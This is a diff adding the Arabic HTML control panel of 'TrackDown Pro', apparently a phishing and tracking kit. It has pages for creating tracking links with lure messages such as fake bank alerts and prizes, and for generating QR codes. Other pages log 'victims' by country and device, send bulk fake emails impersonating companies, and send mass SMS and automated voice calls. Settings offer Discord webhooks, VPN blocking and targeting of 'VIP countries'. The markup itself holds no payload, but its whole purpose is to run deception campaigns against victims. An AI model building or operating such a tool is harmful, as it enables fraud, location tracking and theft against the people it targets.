@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1a1a2e">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="TrackDown Pro">
+    <link rel="manifest" href="manifest.json">
+    <link rel="apple-touch-icon" href="icons/icon.svg">
+    <title>TrackDown Pro - لوحة التحكم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="app">
+        <div id="login-screen" class="screen active">
+            <div class="login-container">
+                <div class="login-logo">
+                    <i class="fas fa-crosshairs"></i>
+                    <h1>TrackDown Pro</h1>
+                    <p>v5.1 - لوحة التحكم المتقدمة</p>
+                </div>
+                <form id="login-form">
+                    <div class="input-group">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="username" placeholder="اسم المستخدم" required>
+                    </div>
+                    <div class="input-group">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="password" placeholder="كلمة المرور" required>
+                    </div>
+                    <button type="submit" class="btn-primary">
+                        <i class="fas fa-sign-in-alt"></i>
+                        تسجيل الدخول
+                    </button>
+                </form>
+                <div class="login-footer">
+                    <p>جميع الحقوق محفوظة &copy; 2026</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="main-screen" class="screen">
+            <nav class="sidebar">
+                <div class="sidebar-header">
+                    <i class="fas fa-crosshairs"></i>
+                    <span>TrackDown Pro</span>
+                </div>
+                <ul class="nav-menu">
+                    <li class="nav-item active" data-page="dashboard">
+                        <i class="fas fa-home"></i>
+                        <span>الرئيسية</span>
+                    </li>
+                    <li class="nav-item" data-page="create-link">
+                        <i class="fas fa-link"></i>
+                        <span>إنشاء رابط</span>
+                    </li>
+                    <li class="nav-item" data-page="victims">
+                        <i class="fas fa-users"></i>
+                        <span>الضحايا</span>
+                    </li>
+                    <li class="nav-item" data-page="stats">
+                        <i class="fas fa-chart-bar"></i>
+                        <span>الإحصائيات</span>
+                    </li>
+                    <li class="nav-item" data-page="fake-email">
+                        <i class="fas fa-envelope"></i>
+                        <span>بريد وهمي</span>
+                    </li>
+                    <li class="nav-item" data-page="sms-calls">
+                        <i class="fas fa-phone"></i>
+                        <span>SMS/مكالمات</span>
+                    </li>
+                    <li class="nav-item" data-page="settings">
+                        <i class="fas fa-cog"></i>
+                        <span>الإعدادات</span>
+                    </li>
+                </ul>
+                <div class="sidebar-footer">
+                    <button id="logout-btn" class="btn-logout">
+                        <i class="fas fa-sign-out-alt"></i>
+                        <span>تسجيل الخروج</span>
+                    </button>
+                </div>
+            </nav>
+
+            <div class="main-content">
+                <header class="top-bar">
+                    <button id="menu-toggle" class="menu-toggle">
+                        <i class="fas fa-bars"></i>
+                    </button>
+                    <div class="user-info">
+                        <span id="current-user">المستخدم</span>
+                        <i class="fas fa-user-circle"></i>
+                    </div>
+                </header>
+
+                <div id="dashboard-page" class="page active">
+                    <h2><i class="fas fa-home"></i> لوحة التحكم</h2>
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-icon"><i class="fas fa-users"></i></div>
+                            <div class="stat-info">
+                                <h3 id="total-victims">0</h3>
+                                <p>إجمالي الضحايا</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon"><i class="fas fa-calendar-day"></i></div>
+                            <div class="stat-info">
+                                <h3 id="today-victims">0</h3>
+                                <p>ضحايا اليوم</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon"><i class="fas fa-link"></i></div>
+                            <div class="stat-info">
+                                <h3 id="total-links">0</h3>
+                                <p>الروابط النشطة</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon"><i class="fas fa-map-marker-alt"></i></div>
+                            <div class="stat-info">
+                                <h3 id="total-locations">0</h3>
+                                <p>المواقع المحددة</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="recent-activity">
+                        <h3><i class="fas fa-clock"></i> آخر النشاطات</h3>
+                        <div id="activity-list" class="activity-list"></div>
+                    </div>
+                </div>
+
+                <div id="create-link-page" class="page">
+                    <h2><i class="fas fa-link"></i> إنشاء رابط تتبع</h2>
+                    <div class="form-container">
+                        <div class="form-group">
+                            <label>اختر القالب</label>
+                            <div class="templates-grid" id="templates-grid"></div>
+                        </div>
+                        <div class="form-group">
+                            <label>رابط إعادة التوجيه</label>
+                            <input type="url" id="redirect-url" placeholder="https://example.com">
+                        </div>
+                        <div class="form-group">
+                            <label>رسالة وهمية (اختياري)</label>
+                            <select id="fake-message-select">
+                                <option value="">بدون رسالة</option>
+                                <option value="security">تحذير أمني</option>
+                                <option value="prize">ربحت جائزة</option>
+                                <option value="update">تحديث مطلوب</option>
+                                <option value="bank">تنبيه بنكي</option>
+                            </select>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group half">
+                                <label><input type="checkbox" id="password-protect"> حماية بكلمة مرور</label>
+                                <input type="text" id="link-password" placeholder="كلمة المرور" style="display:none;">
+                            </div>
+                            <div class="form-group half">
+                                <label><input type="checkbox" id="link-expiry"> تاريخ انتهاء</label>
+                                <input type="number" id="expiry-hours" placeholder="ساعات" style="display:none;">
+                            </div>
+                        </div>
+                        <button id="generate-link-btn" class="btn-primary btn-block">
+                            <i class="fas fa-magic"></i> إنشاء الرابط
+                        </button>
+                        <div id="generated-link" class="generated-link" style="display:none;">
+                            <p>الرابط الخاص بك:</p>
+                            <div class="link-box">
+                                <input type="text" id="link-output" readonly>
+                                <button id="copy-link-btn"><i class="fas fa-copy"></i></button>
+                            </div>
+                            <button id="generate-qr-btn" class="btn-secondary">
+                                <i class="fas fa-qrcode"></i> إنشاء QR Code
+                            </button>
+                            <div id="qr-container"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="victims-page" class="page">
+                    <h2><i class="fas fa-users"></i> سجل الضحايا</h2>
+                    <div class="filter-bar">
+                        <input type="text" id="search-victims" placeholder="بحث...">
+                        <select id="filter-country">
+                            <option value="">كل الدول</option>
+                        </select>
+                        <button id="export-csv-btn" class="btn-secondary">
+                            <i class="fas fa-download"></i> تصدير CSV
+                        </button>
+                    </div>
+                    <div id="victims-list" class="victims-list"></div>
+                </div>
+
+                <div id="stats-page" class="page">
+                    <h2><i class="fas fa-chart-bar"></i> الإحصائيات المتقدمة</h2>
+                    <div class="stats-tabs">
+                        <button class="tab-btn active" data-period="daily">يومي</button>
+                        <button class="tab-btn" data-period="weekly">أسبوعي</button>
+                        <button class="tab-btn" data-period="monthly">شهري</button>
+                    </div>
+                    <div class="charts-container">
+                        <div class="chart-card">
+                            <h3>الضحايا حسب الدولة</h3>
+                            <div id="countries-chart" class="chart"></div>
+                        </div>
+                        <div class="chart-card">
+                            <h3>المتصفحات الأكثر استخداماً</h3>
+                            <div id="browsers-chart" class="chart"></div>
+                        </div>
+                        <div class="chart-card">
+                            <h3>الأجهزة</h3>
+                            <div id="devices-chart" class="chart"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="fake-email-page" class="page">
+                    <h2><i class="fas fa-envelope"></i> إرسال بريد وهمي</h2>
+                    <div class="form-container">
+                        <div class="form-group">
+                            <label>اختر الشركة</label>
+                            <div class="company-grid" id="company-grid"></div>
+                        </div>
+                        <div class="form-group">
+                            <label>البريد الإلكتروني للضحية</label>
+                            <textarea id="victim-emails" placeholder="أدخل البريد (واحد في كل سطر للإرسال الجماعي)"></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label>رابط التتبع</label>
+                            <input type="url" id="email-tracking-link" placeholder="أدخل رابط التتبع">
+                        </div>
+                        <div class="form-group">
+                            <label>الرسالة الإضافية (اختياري)</label>
+                            <textarea id="email-message" placeholder="رسالة إضافية..."></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label><input type="checkbox" id="schedule-email"> جدولة الإرسال</label>
+                            <input type="datetime-local" id="schedule-time" style="display:none;">
+                        </div>
+                        <button id="send-email-btn" class="btn-primary btn-block">
+                            <i class="fas fa-paper-plane"></i> إرسال البريد
+                        </button>
+                    </div>
+                </div>
+
+                <div id="sms-calls-page" class="page">
+                    <h2><i class="fas fa-phone"></i> SMS والمكالمات</h2>
+                    <div class="tabs">
+                        <button class="tab-btn active" data-tab="sms">SMS جماعي</button>
+                        <button class="tab-btn" data-tab="calls">مكالمات</button>
+                    </div>
+                    <div id="sms-tab" class="tab-content active">
+                        <div class="form-container">
+                            <div class="form-group">
+                                <label>أرقام الهواتف</label>
+                                <textarea id="phone-numbers" placeholder="أدخل الأرقام (واحد في كل سطر)"></textarea>
+                            </div>
+                            <div class="form-group">
+                                <label>نص الرسالة</label>
+                                <textarea id="sms-message" placeholder="نص الرسالة..."></textarea>
+                            </div>
+                            <button id="send-sms-btn" class="btn-primary btn-block">
+                                <i class="fas fa-sms"></i> إرسال SMS
+                            </button>
+                        </div>
+                    </div>
+                    <div id="calls-tab" class="tab-content">
+                        <div class="form-container">
+                            <div class="form-group">
+                                <label>رقم الهاتف</label>
+                                <input type="tel" id="call-number" placeholder="+966xxxxxxxxx">
+                            </div>
+                            <div class="form-group">
+                                <label>الرسالة الصوتية</label>
+                                <textarea id="call-message" placeholder="الرسالة التي ستُقرأ..."></textarea>
+                            </div>
+                            <button id="make-call-btn" class="btn-primary btn-block">
+                                <i class="fas fa-phone"></i> إجراء المكالمة
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="settings-page" class="page">
+                    <h2><i class="fas fa-cog"></i> الإعدادات</h2>
+                    <div class="settings-container">
+                        <div class="setting-group">
+                            <h3><i class="fas fa-bell"></i> الإشعارات</h3>
+                            <div class="setting-item">
+                                <label>ربط Discord Webhook</label>
+                                <input type="url" id="discord-webhook" placeholder="https://discord.com/api/webhooks/...">
+                            </div>
+                            <div class="setting-item">
+                                <label>التقارير اليومية</label>
+                                <label class="switch">
+                                    <input type="checkbox" id="daily-reports">
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+                        </div>
+                        <div class="setting-group">
+                            <h3><i class="fas fa-shield-alt"></i> الأمان</h3>
+                            <div class="setting-item">
+                                <label>حظر VPN تلقائي</label>
+                                <label class="switch">
+                                    <input type="checkbox" id="vpn-block">
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+                            <div class="setting-item">
+                                <label>القائمة البيضاء للدول</label>
+                                <input type="text" id="whitelist-countries" placeholder="SA, AE, EG...">
+                            </div>
+                        </div>
+                        <div class="setting-group">
+                            <h3><i class="fas fa-star"></i> دول VIP</h3>
+                            <input type="text" id="vip-countries" placeholder="SA, AE, KW...">
+                        </div>
+                        <button id="save-settings-btn" class="btn-primary">
+                            <i class="fas fa-save"></i> حفظ الإعدادات
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="modal-close">&times;</span>
+            <div id="modal-body"></div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(reg => {
+                console.log('SW registered');
+            });
+        }
+    </script>
+</body>
+</html>
